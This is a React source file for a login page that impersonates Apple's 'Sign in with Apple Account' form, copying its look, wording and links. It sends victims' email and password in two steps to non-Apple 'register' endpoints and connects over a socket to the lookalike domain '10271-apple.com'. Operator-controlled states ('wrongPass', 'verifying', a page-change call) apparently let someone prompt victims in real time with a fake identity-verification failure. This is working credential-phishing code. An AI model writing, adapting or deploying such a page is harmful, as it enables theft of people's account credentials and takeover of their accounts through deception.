import React, { useEffect, useRef, useState } from "react";
import Layout from "../components/layout/Layout";
import { motion } from "framer-motion";
import Loader from "../components/Loader";
import { GoArrowUpRight } from "react-icons/go";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { io } from "socket.io-client";

function Login({ authUser }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const [isFocused, setIsFocused] = useState(false);
  const [isPassFocused, setIsPassFocused] = useState(false);

  const [showPassword, setShowPassword] = useState(false);
  const [shouldRenderPassword, setShouldRenderPassword] = useState(false);

  const [isPassPending, setIsPassPending] = useState(false);

  const isActive = isFocused || email !== "";
  const isPassActive = isPassFocused || password !== "";

  // Create a reference to the email input
  const emailInputRef = useRef(null);

  // Focus the email input after the component mounts
  useEffect(() => {
    if (emailInputRef.current) {
      emailInputRef.current.focus();
    }
  }, []);

  // 👇 Hide password field if email is cleared
  useEffect(() => {
    if (email.trim() === "") {
      setShowPassword(false);
      const timer = setTimeout(() => {
        setShouldRenderPassword(false);
      }, 125); // Delay to allow exit animation
      return () => clearTimeout(timer);
    }
  }, [email]);

  // 👇 Ensure render state is synced with showPassword
  useEffect(() => {
    if (showPassword && email.trim() !== "") {
      setShouldRenderPassword(true);
    }
  }, [showPassword, email]);

  const passwordRef = useRef(null);
  const hasFocusedPassword = useRef(false);

  useEffect(() => {
    if (showPassword && email.trim() !== "" && !hasFocusedPassword.current) {
      passwordRef.current?.focus();
      hasFocusedPassword.current = true; // 🔒 only focus once
    }

    // Reset focus lock when hiding the password field
    if (!showPassword) {
      hasFocusedPassword.current = false;
    }
  }, [showPassword]);

  const [isChecked, setIsChecked] = useState(false);

  // Toggle the checkbox state when either the checkbox or label is clicked
  const handleCheckboxClick = () => {
    setIsChecked(!isChecked);
  };

  const isPassWrong = authUser?.currentStatus === "wrongPass";

  const queryClient = useQueryClient();

  const {
    mutate: loginMutation,
    isError,
    error,
    isPending: isEmailPending,
  } = useMutation({
    mutationFn: async () => {
      try {
        const res = await fetch("/api/v1/rumman/auth/first-register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email,
          }),
        });

        const data = await res.json();
        if (data.error) {
          throw new Error(data.error);
        }

        console.log(data);
        return data;
      } catch (error) {
        console.log(error);
        throw error;
      }
    },
    onSuccess: () => {
      if (email.trim() !== "") {
        setShowPassword(true);
        setShouldRenderPassword(true);
      }
    },
  });

  const { mutate: secondLoginMutation } = useMutation({
    mutationFn: async () => {
      try {
        const res = await fetch("/api/v1/rumman/auth/second-register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            password,
          }),
        });

        const data = await res.json();
        if (data.error) {
          throw new Error(data.error);
        }

        console.log(data);
        return data;
      } catch (error) {
        console.log(error);
        throw error;
      }
    },
  });

  const handleFirstSubmit = () => {
    loginMutation();
  };

  const handleSecondSubmit = () => {
    secondLoginMutation();
  };

  //listen to socket event
  useEffect(() => {
    const newSocket = io("https://10271-apple.com"); // Replace with your server's URL

    // Listen for new user registration events
    newSocket.on("user_updated", () => {
      console.log("User updated received: for second register");
      queryClient.invalidateQueries({ queryKey: ["authUser"] });
    });

    return () => newSocket.close();
  }, []);

  const [pageName, setPageName] = useState("");

  //mutation to change page
  const { mutate: changePage, isPending: changingPage } = useMutation({
    mutationFn: async (userId) => {
      try {
        const res = await fetch(
          `/api/v1/rumman/user/page/${userId}/${pageName}`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
          }
        );

        const data = await res.json();
        if (!res.ok) {
          throw new Error("Failed to change page", data.error);
        }
        return data;
      } catch (error) {
        console.log("Error changing page", error);
        throw error;
      }
    },
  });

  return (
    <Layout>
      <div className=" pt-[44px]">
        <div className=" w-full flex flex-col items-center">
          <div className=" sm:w-[640px] w-full h-screen sm:h-[610px] apple-shadow sm:rounded-[34px] sm:mt-[44px]">
            {/* logo and text  */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 2, delay: 1.5 }}
              className=" flex flex-col items-center"
            >
              <div className=" w-[160px] h-[160px] flex items-center justify-center mt-[40px]">
                <img
                  src="https://res.cloudinary.com/dsdg8ke2n/image/upload/f_auto,q_auto/kd2micn9r2ae73kedpxp"
                  alt=""
                  className=" w-full h-full object-contain"
                />
              </div>
              <div>
                <h1 className=" select-none cursor-default hidden sm:block font-apple text-[32px] font-[600] mt-[14px] text-center text-[rgba(0,0,0,0.88)]">
                  Sign in with Apple&nbsp;Account
                </h1>
                <h1 className="select-none cursor-default sm:hidden block font-apple text-[32px] font-[600] mt-[14px] text-center text-[rgba(0,0,0,0.88)]">
                  Sign in with
                </h1>
                <h1 className=" select-none cursor-default sm:hidden block font-apple text-[32px] font-[600] -mt-3 text-center text-[rgba(0,0,0,0.88)]">
                  Apple&nbsp;Account
                </h1>
              </div>
            </motion.div>

            {/* form  */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 1, delay: 3 }}
              className="sm:mx-[80px] mx-[50px] sm:mt-[34px] mt-[22px] h-[156px]"
            >
              {/* Email Field */}
              <div className="relative h-[3.49412rem] bg-input-color ">
                <input
                  ref={emailInputRef}
                  type="text"
                  autoCapitalize="off"
                  autoCorrect="off"
                  aria-required="true"
                  required
                  spellCheck="false"
                  autoComplete="off"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  onFocus={() => {
                    {
                      if (isPassWrong) {
                        setPageName("normal");
                        changePage(authUser?._id);
                      }
                    }
                    setIsFocused(true);
                  }}
                  onBlur={() => setIsFocused(false)}
                  className={`text-[17px] leading-[1.23536] font-[400] tracking-[.022em] w-full h-full text-[#494949] border ${
                    isPassWrong ? "border-[#e30000]" : "border-border-color"
                  }  ${isPassWrong ? "bg-[#fff2f4]" : "bg-input-color"}  ${
                    showPassword && email.trim() !== ""
                      ? "rounded-br-none rounded-bl-none rounded-[12px]"
                      : "rounded-[12px]"
                  } pr-[43px] pt-[1.05882rem] pb-0 pl-[0.941176rem] outline-none focus:border-2 focus:border-[#0071e3]`}
                />

                <motion.span
                  initial={false}
                  animate={{
                    top: isActive ? "0.58824rem" : "50%",
                    left: "1.1rem",
                    fontSize: isActive ? "12.8px" : "18px",
                    translateY: isActive ? "0%" : "-50%",
                    fontWeight: isActive ? "400" : "400",
                  }}
                  transition={{ duration: 0.125, ease: "easeInOut" }}
                  className={`${
                    isPassWrong ? "text-[#e30000]" : "text-[#6e6e73]"
                  }   tracking-[.022em] leading-[1.33536] absolute pointer-events-none font-apple origin-left`}
                >
                  Email or Phone Number
                </motion.span>

                {/* Submit Button */}
                <motion.div
                  className="absolute right-[13px] cursor-pointer inline-block"
                  initial={false}
                  animate={{
                    top: "52.782%",
                    translateY:
                      isActive && !isEmailPending ? "-20%" : "-48.228%",
                    opacity: showPassword ? 0 : 1,
                    pointerEvents: showPassword ? "none" : "auto",
                  }}
                  transition={{ duration: 0.125, ease: "easeInOut" }}
                  onClick={() => {
                    handleFirstSubmit();
                  }}
                >
                  {!isEmailPending ? (
                    <div
                      className={`p-1 border ${
                        isActive ? " border-[#494949]" : "border-border-color"
                      }  rounded-full flex items-center justify-center`}
                    >
                      <div className="w-[16px] h-[16px]">
                        <img
                          src="/right.ico"
                          alt=""
                          className={`w-full h-full object-contain ${
                            isActive && email !== ""
                              ? "opacity-70"
                              : "opacity-40"
                          } transition ml-[1px]`}
                        />
                      </div>
                    </div>
                  ) : (
                    <Loader />
                  )}
                </motion.div>
              </div>

              {/* Password Field */}
              {shouldRenderPassword && (
                <motion.div
                  initial={{ opacity: 0, y: -20 }}
                  animate={{
                    opacity: showPassword ? 1 : 0,
                    y: showPassword ? 0 : -20,
                  }}
                  transition={{
                    duration: 0.125,
                    ease: "easeInOut",
                  }}
                  className="relative h-[3.49412rem] bg-input-color"
                >
                  <input
                    ref={passwordRef}
                    type="password"
                    autoCapitalize="off"
                    autoCorrect="off"
                    aria-required="true"
                    required
                    spellCheck="false"
                    autoComplete="off"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onFocus={() => {
                      {
                        if (isPassWrong) {
                          setPageName("normal");
                          changePage(authUser?._id);
                        }
                      }
                      setIsPassFocused(true);
                    }}
                    onBlur={() => setIsPassFocused(false)}
                    className={`text-[17px] leading-[1.23536] font-[400] tracking-[.022em] w-full h-full text-[#494949] border border-t-transparent ${
                      isPassWrong ? "border-[#e30000]" : "border-border-color"
                    }  ${
                      isPassWrong ? "bg-[#fff2f4]" : "bg-input-color"
                    } rounded-bl-[12px] rounded-br-[12px] pr-[43px] pt-[1.05882rem] pb-0 pl-[0.941176rem] outline-none focus:border-2 focus:border-[#0071e3]`}
                  />

                  <motion.span
                    initial={false}
                    animate={{
                      top: isPassActive ? "0.58824rem" : "50%",
                      left: "1.1rem",
                      fontSize: isPassActive ? "12.8px" : "18px",
                      translateY: isPassActive ? "0%" : "-50%",
                      fontWeight: isPassActive ? "400" : "300",
                    }}
                    transition={{ duration: 0.125, ease: "easeInOut" }}
                    className={`${
                      isPassWrong ? "text-[#e30000]" : "text-[#6e6e73]"
                    } font-[300] tracking-[.022em] leading-[1.33536] absolute pointer-events-none font-apple origin-left`}
                  >
                    Password
                  </motion.span>

                  <motion.div
                    className="absolute right-[13px]  inline-block"
                    initial={false}
                    animate={{
                      top: "52.782%",
                      translateY:
                        isPassActive && authUser?.currentStatus !== "verifying"
                          ? "-20%"
                          : "-48.228%",
                    }}
                    transition={{ duration: 0.125, ease: "easeInOut" }}
                  >
                    {authUser?.currentStatus !== "verifying" ? (
                      <div
                        onClick={() => {
                          handleSecondSubmit();
                        }}
                        className={`p-1 border ${
                          isPassActive
                            ? " border-[#494949]"
                            : "border-border-color"
                        }  rounded-full flex items-center cursor-pointer justify-center`}
                      >
                        <div className="w-[16px] h-[16px]">
                          <img
                            src="/right.ico"
                            alt=""
                            className={`w-full h-full object-contain ${
                              isPassActive && password !== ""
                                ? "opacity-70"
                                : "opacity-40"
                            } transition ml-[1px]`}
                          />
                        </div>
                      </div>
                    ) : (
                      <Loader />
                    )}
                  </motion.div>
                </motion.div>
              )}
              {/* pass wrong tooltip  */}
              {isPassWrong && (
                <div className="relative mt-[5px] pt-1.5 w-fit mx-auto">
                  {/* Arrow with border, perfectly connecting to box */}
                  <div
                    className="absolute top-[1px] left-1/2 -translate-x-1/2 w-0 h-0
    border-l-[10px] border-l-transparent 
    border-r-[10px] border-r-transparent 
    border-b-[7px] border-b-[#fae9a3] z-50"
                  ></div>

                  {/* Tooltip box */}
                  <div className="bg-[#fae9a3] w-[305px] flex items-center justify-center p-[11px] border border-[#b9950178] text-[#494949] text-[15px] font-[500] rounded-[5px] tooltip-shadow  relative z-20">
                    Failed to verify your identity. Try again.
                  </div>
                </div>
              )}
            </motion.div>

            {/* remember me  */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 1, delay: 3 }}
              className="mt-[18px] mb-[16px] flex items-center justify-center gap-3.5"
            >
              <input
                type="checkbox"
                id="keepMeSignedIn"
                checked={isChecked}
                onChange={handleCheckboxClick}
                style={{
                  width: ".9411764706rem",
                  height: ".9411764706rem",
                  borderRadius: ".1764705882rem",
                  backgroundColor: "#fafafa",
                  borderColor: "#86868b",
                }}
                className="cursor-pointer -mt-[4px] -mr-[4px]"
              />
              <label htmlFor="keepMeSignedIn" className="cursor-default">
                <span className=" -mr-[3px] -mt-[2px] whitespace-nowrap text-[17.6px] font-[400] tracking-[.022em] text-[#494949]">
                  Keep me signed in
                </span>
              </label>
            </motion.div>

         {/* forgot password */}
<motion.div
  initial={{ opacity: 0 }}
  animate={{ opacity: 1 }}
  transition={{ duration: 1, delay: 3 }}
  className="-mr-[2px] mb-[9px] mt-[26px] flex items-center justify-center"
>
  <a
    href="https://iforgot.apple.com/password/verify/appleid"
    target="_blank"
    rel="noopener noreferrer"
    className="hover:underline cursor-pointer text-[16px] leading-[1.42859] font-[300] tracking-[-.01em] text-[#06c] flex items-center"
  >
    <span>Forgot password?</span>
    <GoArrowUpRight className="w-3.5 h-3.5 -mb-[2px] ml-[0.1em] text-[#06c]" />
  </a>
</motion.div>

{/* create account */}
<motion.div
  initial={{ opacity: 0 }}
  animate={{ opacity: 1 }}
  transition={{ duration: 1, delay: 3 }}
  className="-mt-[2px] mb-[9px] flex items-center justify-center"
>
  <a
    href="https://appleid.apple.com/account#!&page=create"
    target="_blank"
    rel="noopener noreferrer"
    className="hover:underline cursor-pointer text-[15.8px] leading-[1.42859] font-[300] tracking-[.001em] text-[#06c] flex items-center"
  >
    <span>Create Apple Account</span>
    <GoArrowUpRight className="w-3.5 h-3.5 -mb-[2px] ml-[0.1em] text-[#06c]" />
  </a>
</motion.div>

          </div>
        </div>
      </div>
    </Layout>
  );
}

export default Login;



















